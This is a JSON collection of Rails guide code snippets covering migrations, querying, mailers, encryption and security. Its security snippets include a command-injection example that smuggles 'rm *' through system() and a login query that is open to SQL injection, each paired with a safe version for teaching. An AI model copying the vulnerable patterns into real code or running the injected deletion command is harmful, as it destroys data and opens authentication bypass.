[
  {
    "owner": "rails",
    "repo": "rails",
    "content": "TITLE: Secure Command Line Parameter Handling in Ruby\nDESCRIPTION: Demonstrates the proper way to pass command line parameters securely using the multi-parameter version of system(), which prevents command injection attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nsystem(\"/bin/echo\", \"hello; rm *\")\n# prints \"hello; rm *\" and does not delete files\n```\n\n----------------------------------------\n\nTITLE: Creating Table with UUID Foreign Key Reference - Ruby\nDESCRIPTION: This snippet demonstrates how to create a table in Rails with a UUID as the primary key and configure a foreign key reference to another table using UUIDs. Setting `type: :uuid` ensures that the foreign key column matches the primary key's data type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_table :posts, id: :uuid do |t|\n  t.references :author, type: :uuid, foreign_key: true\n  # Other columns...\n  t.timestamps\nend\n```\n\n----------------------------------------\n\nTITLE: Schema Output for Table with UUID Primary Key - Ruby\nDESCRIPTION: This code shows the generated schema output for the `authors` table. It confirms that the `id` column is defined as a UUID, defaults to `gen_random_uuid()`, and includes timestamps. The `force: :cascade` option is also displayed in the table definition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_table \"authors\", id: :uuid, default: -> { \"gen_random_uuid()\" }, force: :cascade do |t|\n  t.datetime \"created_at\", precision: 6, null: false\n  t.datetime \"updated_at\", precision: 6, null: false\nend\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Command Line Injection Vulnerability in Ruby\nDESCRIPTION: Shows how user input can be used to execute unwanted commands when using system() incorrectly, allowing attackers to run arbitrary system commands by adding command separators.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nuser_input = \"hello; rm *\"\nsystem(\"/bin/echo #{user_input}\")\n# prints \"hello\", and deletes files in the current directory\n```\n\n----------------------------------------\n\nTITLE: Declaring Attachment on Active Record Model via has_one_attached (Ruby)\nDESCRIPTION: Shows how to use Rails' has_one_attached macro to associate a single file (e.g., avatar) with a model such as User. Provides a minimal model definition; Rails manages the underlying storage and association. No additional dependencies except Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one_attached :avatar\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Force SSL in Rails Application\nDESCRIPTION: This configuration enforces SSL connection for all requests in a Rails application, providing protection against session hijacking in insecure networks. It's recommended for applications that handle sensitive user data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.force_ssl = true\n```\n\n----------------------------------------\n\nTITLE: Running the Rails Authentication Generator (Bash)\nDESCRIPTION: Shows the command `rails generate authentication` used to set up basic authentication in a Rails 8.0+ application. The output lists the created models (`Session`, `User`, `Current`), controllers (`SessionsController`, `PasswordsController`, `Authentication` concern), views (for passwords and sessions), mailers (`PasswordsMailer`), routes, and migrations for `users` and `sessions` tables. It also highlights the modification of `ApplicationController` and `Gemfile` (adding the `bcrypt` gem) and the subsequent `bundle install`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails generate authentication\n      invoke  erb\n      create    app/views/passwords/new.html.erb\n      create    app/views/passwords/edit.html.erb\n      create    app/views/sessions/new.html.erb\n      create  app/models/session.rb\n      create  app/models/user.rb\n      create  app/models/current.rb\n      create  app/controllers/sessions_controller.rb\n      create  app/controllers/concerns/authentication.rb\n      create  app/controllers/passwords_controller.rb\n      create  app/mailers/passwords_mailer.rb\n      create  app/views/passwords_mailer/reset.html.erb\n      create  app/views/passwords_mailer/reset.text.erb\n      create  test/mailers/previews/passwords_mailer_preview.rb\n        gsub  app/controllers/application_controller.rb\n       route  resources :passwords, param: :token\n       route  resource :session\n        gsub  Gemfile\n      bundle  install --quiet\n    generate  migration CreateUsers email_address:string!:uniq password_digest:string! --force\n       rails  generate migration CreateUsers email_address:string!:uniq password_digest:string! --force\n      invoke  active_record\n      create    db/migrate/20241010215312_create_users.rb\n    generate  migration CreateSessions user:references ip_address:string user_agent:string --force\n       rails  generate migration CreateSessions user:references ip_address:string user_agent:string --force\n      invoke  active_record\n      create    db/migrate/20241010215314_create_sessions.rb\n```\n\n----------------------------------------\n\nTITLE: Displaying Recipient Name with Email Using email_address_with_name (Ruby)\nDESCRIPTION: This snippet shows usage of the email_address_with_name helper to format recipient addresses with display name and email in mailer actions. It supports robust email header formatting, falling back to the email address alone if the name is absent.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\ndef welcome_email\n  @user = params[:user]\n  mail(\n    to: email_address_with_name(@user.email, @user.name),\n    subject: \"Welcome to My Awesome Site\"\n  )\nend\n```\n\n----------------------------------------\n\nTITLE: Contrasting after_save and after_commit in Rails\nDESCRIPTION: This code highlights the key difference between `after_save` and `after_commit` callbacks in Rails.  In `after_save`, an exception will cause the transaction to roll back, preventing the record from being saved. In contrast, an exception in `after_commit` will not roll back the transaction, as the record has already been persisted to the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  after_save do\n    # If this fails the user won't be saved.\n    EventLog.create!(event: \"user_saved\")\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  after_commit do\n    # If this fails the user was already saved.\n    EventLog.create!(event: \"user_saved\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Connecting Models to Writing and Replica Shards - ActiveRecord - Ruby\nDESCRIPTION: These Ruby classes demonstrate connecting the base ApplicationRecord to primary and replica databases, and then using the 'connects_to' API for ShardRecord to link to multiple shards and their replicas. It requires correctly named database configuration and is foundational for building multi-tenant Rails apps with horizontal sharding.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationRecord < ActiveRecord::Base\n  primary_abstract_class\n\n  connects_to database: { writing: :primary, reading: :primary_replica }\nend\n\nclass ShardRecord < ApplicationRecord\n  self.abstract_class = true\n\n  connects_to shards: {\n    shard_one: { writing: :primary_shard_one, reading: :primary_shard_one_replica },\n    shard_two: { writing: :primary_shard_two, reading: :primary_shard_two_replica }\n  }\nend\n\nclass Person < ShardRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Configure Parameter Filtering in Rails\nDESCRIPTION: This snippet demonstrates how to configure parameter filtering in Rails to prevent sensitive information like passwords and credit card numbers from being displayed in logs. It adds regular expressions to the `filter_parameters` array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.filter_parameters += [\n  :passw, :email, :secret, :token, :_key, :crypt, :salt, :certificate, :otp, :ssn, :cvv, :cvc\n]\n```\n\n----------------------------------------\n\nTITLE: Enabling CSRF Protection in Rails Application Controller\nDESCRIPTION: This Ruby code snippet demonstrates how to enable Cross-Site Request Forgery (CSRF) protection in a Rails application controller. It uses the 'protect_from_forgery' method with the 'exception' option to throw an exception when the security token doesn't match.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nprotect_from_forgery with: :exception\n```\n\n----------------------------------------\n\nTITLE: Defining enum in Rails\nDESCRIPTION: This Ruby code defines an enum for the `status` attribute in the `Order` model, mapping symbolic names like `:shipped`, `:being_packaged`, `:complete`, and `:cancelled` to integer values. This allows referring to order statuses by name instead of integer codes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_176\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  enum :status, [:shipped, :being_packaged, :complete, :cancelled]\nend\n```\n\n----------------------------------------\n\nTITLE: Specifying Conditions on Joined Tables in Rails\nDESCRIPTION: This code snippet demonstrates how to add a condition to a joined table using the `where` method with a string. It retrieves all `Customer` objects who have `orders` created within a specific time range, using a string condition in the `where` clause.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_143\n\nLANGUAGE: ruby\nCODE:\n```\ntime_range = (Time.now.midnight - 1.day)..Time.now.midnight\nCustomer.joins(:orders).where(\"orders.created_at\" => time_range).distinct\n```\n\n----------------------------------------\n\nTITLE: Eager Loading Associations with Preload in Rails\nDESCRIPTION: This example demonstrates using `preload` to eager load the `author` association.  Similar to `includes`, this aims to solve the N+1 problem.  It executes 2 queries - one for the books, and one for all the associated authors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_154\n\nLANGUAGE: ruby\nCODE:\n```\nbooks = Book.preload(:author).limit(10)\n\nbooks.each do |book|\n  puts book.author.last_name\nend\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books LIMIT 10\nSELECT authors.* FROM authors\n  WHERE authors.id IN (1,2,3,4,5,6,7,8,9,10)\n```\n\n----------------------------------------\n\nTITLE: Configuring MySQL/MariaDB Database for JRuby (YAML)\nDESCRIPTION: This YAML snippet configures a MySQL or MariaDB database for the development environment using JRuby. It specifies the `jdbcmysql` adapter, database name, username, and password.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_94\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: jdbcmysql\n  database: blog_development\n  username: root\n  password:\n```\n\n----------------------------------------\n\nTITLE: Using the Numericality Validator in a Rails Model (Ruby)\nDESCRIPTION: Demonstrates how to use the `numericality` validator in an ActiveRecord model (`Player`). It validates that the `points` attribute is numeric (integer or float) and that the `games_played` attribute is strictly an integer using the `:only_integer` option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass Player < ApplicationRecord\n  validates :points, numericality: true\n  validates :games_played, numericality: { only_integer: true }\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Migration Strategy in Ruby\nDESCRIPTION: This code shows how to implement a custom migration strategy to override default behavior in database migrations. The `CustomMigrationStrategy` class inherits from `ActiveRecord::Migration::DefaultStrategy` and overrides the `drop_table` method to raise an error, effectively disabling the ability to drop tables in migrations. Setting `config.active_record.migration_strategy` to `CustomMigrationStrategy` applies this custom strategy globally.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nclass CustomMigrationStrategy < ActiveRecord::Migration::DefaultStrategy\n  def drop_table(*)\n    raise \"Dropping tables is not supported!\"\n  end\nend\n\nconfig.active_record.migration_strategy = CustomMigrationStrategy\n```\n\n----------------------------------------\n\nTITLE: Switching Base Controller for API-Only Rails Application - Ruby\nDESCRIPTION: Updates the application controller to inherit from ActionController::API instead of ActionController::Base in app/controllers/application_controller.rb. This change reduces middleware and includes only modules essential for APIs, resulting in a lighter and faster controller stack. No dependencies beyond Rails itself.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::API\nend\n```\n\n----------------------------------------\n\nTITLE: Parsing HTML Responses to Nokogiri Document in Tests - Ruby on Rails - Ruby\nDESCRIPTION: Shows how to use ActionDispatch::Testing to parse HTML HTTP response bodies automatically into Nokogiri::HTML5::Document instances, which can then be traversed, queried, and pattern matched with Minitest. This facilitates more expressive and precise test assertions regarding the HTML structure and content.\n\n- Dependencies: Rails >= 7.1, Nokogiri gem, Minitest\n- Parameters: HTML response bodies from controller tests\n- Input: HTTP GET requests\n- Output: Nokogiri document and pattern-matched assertions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/posts\"\n\nresponse.content_type         # => \"text/html; charset=utf-8\"\nresponse.parsed_body.class    # => Nokogiri::HTML5::Document\nresponse.parsed_body.to_html  # => \"<!DOCTYPE html>\\n<html>\\n...\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/posts\"\n\nhtml = response.parsed_body # => <html>\n                            #      <head></head>\n                            #        <body>\n                            #          <main><h1>Some main content</h1></main>\n                            #        </body>\n                            #     </html>\n\nassert_pattern { html.at(\"main\") => { content: \"Some main content\" } }\nassert_pattern { html.at(\"main\") => { content: /content/ } }\nassert_pattern { html.at(\"main\") => { children: [{ name: \"h1\", content: /content/ }] } }\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Authentication Query\nDESCRIPTION: Example of an unsafe authentication query that could allow bypass of login credentials through SQL injection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nUser.find_by(\"login = '#{params[:name]}' AND password = '#{params[:password]}'\")\n```\n\n----------------------------------------\n\nTITLE: Proper HTML sanitization using whitelist in Rails\nDESCRIPTION: A secure approach to HTML sanitization in Rails using a permitted list of allowed tags and attributes. This demonstrates the recommended way to filter user input to prevent XSS attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\ntags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)\ns = sanitize(user_input, tags: tags, attributes: %w(href title))\n```\n\n----------------------------------------\n\nTITLE: Defining CRUD Routes in Rails\nDESCRIPTION: This Ruby code snippet demonstrates how to manually define routes for CRUD operations on a `products` resource. It includes routes for index, new, create, show, edit, update (using both PATCH and PUT), and destroy actions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/products\", to: \"products#index\"\n\nget \"/products/new\", to: \"products#new\"\npost \"/products\", to: \"products#create\"\n\nget \"/products/:id\", to: \"products#show\"\n\nget \"/products/:id/edit\", to: \"products#edit\"\npatch \"/products/:id\", to: \"products#update\"\nput \"/products/:id\", to: \"products#update\"\n\ndelete \"/products/:id\", to: \"products#destroy\"\n```\n\n----------------------------------------\n\nTITLE: Find or Create with exception in Rails\nDESCRIPTION: This Ruby code demonstrates the use of `find_or_create_by!` to find a customer with the first name 'Andy'. If a customer with that name does not exist, it attempts to create a new customer record. If the new record is invalid (e.g., due to missing required attributes), it raises an `ActiveRecord::RecordInvalid` exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_189\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_or_create_by!(first_name: 'Andy')\n```\n\n----------------------------------------\n\nTITLE: Secure Project Record Retrieval with Authorization Check\nDESCRIPTION: A secure approach to fetching a record that includes authorization verification. This ensures the current user has access to the requested project by scoping the query to only their accessible projects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\n@project = @current_user.projects.find(params[:id])\n```\n\n----------------------------------------\n\nTITLE: Implementing Deterministic Encryption\nDESCRIPTION: Example of using deterministic encryption to enable querying encrypted data in Active Record models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  encrypts :email, deterministic: true\nend\n\nAuthor.find_by_email(\"some@email.com\") # You can query the model normally\n```\n\n----------------------------------------\n\nTITLE: Using Time.current in Rails\nDESCRIPTION: The `Time.current` method in Rails' Active Support returns the current time in the user's time zone, if one is defined. Otherwise, it defaults to `Time.now`. It simplifies time handling within a Rails application by providing a time zone-aware alternative to `Time.now`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_172\n\nLANGUAGE: ruby\nCODE:\n```\nTime.zone_default\n# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name=\"Madrid\", ...>\nTime.current\n# => Fri, 06 Aug 2010 17:11:58 CEST +02:00\n```\n\n----------------------------------------\n\nTITLE: Running Database Migrations\nDESCRIPTION: This command applies any pending migrations to the database. It checks for new migration files and executes the changes they define.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: User Model with has_secure_password (Ruby)\nDESCRIPTION: Displays the generated `User` model (`app/models/user.rb`). It includes the `has_secure_password` call, which adds methods for setting and authenticating passwords using bcrypt hashing. It also defines a `has_many :sessions` association with dependent destroy and normalizes the `email_address` attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_secure_password\n  has_many :sessions, dependent: :destroy\n\n  normalizes :email_address, with: -> e { e.strip.downcase }\nend\n```\n\n----------------------------------------\n\nTITLE: Sanitizing File Names in Ruby for File Uploads\nDESCRIPTION: This code snippet demonstrates how to sanitize file names for uploads using a permitted list approach. It removes path information and replaces non-alphanumeric characters with underscores to prevent malicious file naming.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\ndef sanitize_filename(filename)\n  filename.strip.tap do |name|\n    # NOTE: File.basename doesn't work right with Windows paths on Unix\n    # get only the filename, not the whole path\n    name.sub!(/\\A.*(\\\\|\\/)/, \"\")\n    # Finally, replace all non alphanumeric, underscore\n    # or periods with underscore\n    name.gsub!(/[^\\w.-]/, \"_\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a Database Migration for Books in Ruby on Rails\nDESCRIPTION: This migration creates a 'books' table with 'title' and 'author' columns, along with timestamps. It demonstrates the structure of an ActiveRecord migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateBooks < ActiveRecord::Migration[8.1]\n  def change\n    create_table :books do |t|\n      t.string :title\n      t.string :author\n\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a new Active Job\nDESCRIPTION: This command uses the Rails generator to create a new job file in `app/jobs` and a corresponding test file in `test/jobs`. It provides a starting point for defining background tasks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate job guests_cleanup\ninvoke  test_unit\ncreate    test/jobs/guests_cleanup_job_test.rb\ncreate  app/jobs/guests_cleanup_job.rb\n```\n\n----------------------------------------\n\nTITLE: Reverting parts of a previous migration\nDESCRIPTION: Shows how to use `revert` with a block to undo specific parts of a previous migration. This example demonstrates reverting the creation of a distributors view within an existing migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nclass DontUseDistributorsViewMigration < ActiveRecord::Migration[8.1]\n  def change\n    revert do\n      # copy-pasted code from ExampleMigration\n      create_table :distributors do |t|\n        t.string :zipcode\n      end\n\n      reversible do |direction|\n        direction.up do\n          # create a distributors view\n          execute <<-SQL\n            CREATE VIEW distributors_view AS\n            SELECT id, zipcode\n            FROM distributors;\n          SQL\n        end\n        direction.down do\n          execute <<-SQL\n            DROP VIEW distributors_view;\n          SQL\n        end\n      end\n\n      # The rest of the migration was ok\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Safe SQL Query with Chained Conditions\nDESCRIPTION: Secure way to write SQL queries using chained conditions in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nModel.where(zip_code: entered_zip_code).where(\"quantity >= ?\", entered_quantity).first\n```\n\n----------------------------------------\n\nTITLE: Declaring Per-Attribute Encryption Context in a Model - Ruby\nDESCRIPTION: Demonstrates overriding encryption context elements (such as the encryptor) for a specific model attribute by passing them in the encrypts method. The parameter 'encryptor' expects an object implementing the encryption API. Used in situations where different attributes require separate encryption logic or keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass Attribute\n  encrypts :title, encryptor: MyAttributeEncryptor.new\nend\n```\n\n----------------------------------------\n\nTITLE: Safe SQL Query with Named Parameters\nDESCRIPTION: Secure way to write SQL queries using named parameter sanitization in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nvalues = { zip: entered_zip_code, qty: entered_quantity }\nModel.where(\"zip_code = :zip AND quantity >= :qty\", values).first\n```\n\n----------------------------------------\n\nTITLE: Authenticating Users in SessionsController (Ruby)\nDESCRIPTION: Shows the `create` action in the generated `SessionsController`. It uses the `User.authenticate_by` class method, passing the permitted `email_address` and `password` parameters. If authentication is successful, it calls `start_new_session_for` the user and redirects; otherwise, it redirects back to the login form with an alert.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass SessionsController < ApplicationController\n  def create\n    if user = User.authenticate_by(params.permit(:email_address, :password))\n      start_new_session_for user\n      redirect_to after_authentication_url\n    else\n      redirect_to new_session_url, alert: \"Try another email address or password.\"\n    end\n  end\n\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Default URL Host for Action Mailer (Ruby)\nDESCRIPTION: This configuration snippet sets the default URL host for Action Mailer globally in a Rails application's config/application.rb. It is required for generating absolute URLs in email templates, as mailers are not contextually tied to requests. The host should match the public base URL of the deployed site.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.default_url_options = { host: \"example.com\" }\n```\n\n----------------------------------------\n\nTITLE: Creating Table with belongs_to (Ruby)\nDESCRIPTION: This code snippet shows how to create a `products` table with a foreign key reference to the `categories` table using the `belongs_to` alias, which adds a `category_id` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_28\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :products do |t|\n  t.belongs_to :category\nend\n```\n\n----------------------------------------\n\nTITLE: N+1 Queries Problem Example in Rails\nDESCRIPTION: This example demonstrates the N+1 queries problem.  It iterates through books and gets their author's last name.  This will execute one query for the books and then one query per book for each author, causing performance issues.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_149\n\nLANGUAGE: ruby\nCODE:\n```\nbooks = Book.limit(10)\n\nbooks.each do |book|\n  puts book.author.last_name\nend\n```\n\n----------------------------------------\n\nTITLE: Updating Gemfile for Rails 3.1 Upgrade\nDESCRIPTION: This snippet shows the necessary changes to the Gemfile when upgrading to Rails 3.1. It includes the updated Rails version, database adapter, asset pipeline gems, and jQuery.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_103\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"rails\", \"3.1.12\"\ngem \"mysql2\"\n\n# Needed for the new asset pipeline\ngroup :assets do\n  gem \"sass-rails\",   \"~> 3.1.7\"\n  gem \"coffee-rails\", \"~> 3.1.1\"\n  gem \"uglifier\",     \">= 1.0.3\"\nend\n\n# jQuery is the default JavaScript library in Rails 3.1\ngem \"jquery-rails\"\n```\n\n----------------------------------------\n\nTITLE: Strict Locals Declaration in ERB Templates - Ruby on Rails - ERB\nDESCRIPTION: Demonstrates new options for explicitly declaring accepted local variables in Rails templates using magic comments. This allows stricter control over what locals a template will accept, optionally with defaults, or disables locals entirely. Raises errors if non-declared locals are passed. Useful for catching mistakes and clarifying template contracts in large codebases.\n\n- Dependencies: Rails >= 7.1\n- Parameters: declared locals via magic comment syntax\n- Input: Locals passed to partials\n- Output: Rendered template, or error if constraints violated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_16\n\nLANGUAGE: erb\nCODE:\n```\n<%# locals: (message:) -%>\n<%= message %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%# locals: (message: \"Hello, world!\") -%>\n<%= message %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%# locals: (message: \"Hello, world!\", **attributes) -%>\n<%= tag.p(message, **attributes) %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%# locals: () %>\n```\n\n----------------------------------------\n\nTITLE: Fragment Caching with ERB\nDESCRIPTION: Caches a fragment of view logic for each product. The cache key includes a template tree digest and a cache version derived from the product record. If the view fragment or product is updated, the cache is expired.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_0\n\nLANGUAGE: html+erb\nCODE:\n```\n<% @products.each do |product| %>\n  <% cache product do %>\n    <%= render product %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Job for Production\nDESCRIPTION: This code snippet demonstrates how to configure Active Job to use Solid Queue as the queue adapter in the production environment. It sets `config.active_job.queue_adapter` to `:solid_queue` and specifies the database connection for Solid Queue using `config.solid_queue.connects_to`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/production.rb\n# Replace the default in-process and non-durable queuing backend for Active Job.\nconfig.active_job.queue_adapter = :solid_queue\nconfig.solid_queue.connects_to = { database: { writing: :queue } }\n```\n\n----------------------------------------\n\nTITLE: Generate New Mailbox\nDESCRIPTION: This command generates a new mailbox using the Rails generator, creating the corresponding file and class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\n# Generate new mailbox\n$ bin/rails generate mailbox forwards\n```\n\n----------------------------------------\n\nTITLE: Generated Migration with UUID Primary Key Definition - Ruby\nDESCRIPTION: This code snippet shows the generated migration file for creating an `authors` table with a UUID as the primary key. The `id: :uuid` option sets the primary key type, and `default: -> { \"gen_random_uuid()\" }` specifies a default value using the `gen_random_uuid()` function to generate new UUIDs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAuthors < ActiveRecord::Migration[8.1]\n  def change\n    create_table :authors, id: :uuid do |t|\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Eager Loading Associations with Includes in Rails\nDESCRIPTION: This example demonstrates how to solve the N+1 queries problem by eager loading the `author` association using the `includes` method. This reduces the number of queries from N+1 to just 2.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_150\n\nLANGUAGE: ruby\nCODE:\n```\nbooks = Book.includes(:author).limit(10)\n\nbooks.each do |book|\n  puts book.author.last_name\nend\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books LIMIT 10\nSELECT authors.* FROM authors\n  WHERE authors.id IN (1,2,3,4,5,6,7,8,9,10)\n```\n\n----------------------------------------\n\nTITLE: Creating a Products Table Migration (Ruby)\nDESCRIPTION: This migration creates a 'products' table with 'name' (string), 'description' (text), 'created_at', and 'updated_at' columns. The id column is automatically created. The timestamps macro will automatically manage the created_at and updated_at columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20240502100843_create_products.rb\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :products do |t|\n      t.string :name\n      t.text :description\n\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Eager Loading Associations with eager_load in Rails\nDESCRIPTION: Demonstrates using `eager_load` in Rails to fetch associated records using a single query with a LEFT OUTER JOIN, preventing N+1 query issues. This method improves performance when accessing associated data by preloading it.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_155\n\nLANGUAGE: ruby\nCODE:\n```\nbooks = Book.eager_load(:author).limit(10)\n\nbooks.each do |book|\n  puts book.author.last_name\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying Merged ActiveRecord Configurations (Bash + Ruby)\nDESCRIPTION: This Bash and Ruby code snippet demonstrates how ActiveRecord configurations are merged when both `config/database.yml` and `ENV['DATABASE_URL']` are present. It displays how non-duplicate information from `config/database.yml` (like `pool`) is merged with connection information from `ENV['DATABASE_URL']`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_83\n\nLANGUAGE: Bash\nCODE:\n```\n$ cat config/database.yml\ndevelopment:\n  adapter: sqlite3\n  pool: 5\n\n$ echo $DATABASE_URL\npostgresql://localhost/my_database\n\n$ bin/rails runner 'puts ActiveRecord::Base.configurations.inspect'\n```\n\nLANGUAGE: Ruby\nCODE:\n```\n#<ActiveRecord::DatabaseConfigurations:0x00007fc8eab02880 @configurations=[\n  